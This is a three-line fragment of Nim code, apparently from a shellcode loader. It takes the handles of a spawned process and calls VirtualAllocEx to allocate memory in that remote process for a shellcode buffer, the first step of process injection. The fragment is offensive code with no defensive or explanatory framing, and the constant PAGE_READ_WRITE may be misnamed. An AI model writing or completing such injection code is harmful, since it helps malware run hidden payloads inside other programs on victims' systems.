var tHandle = pi.hThread
var pHandle = pi.hProcess
let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
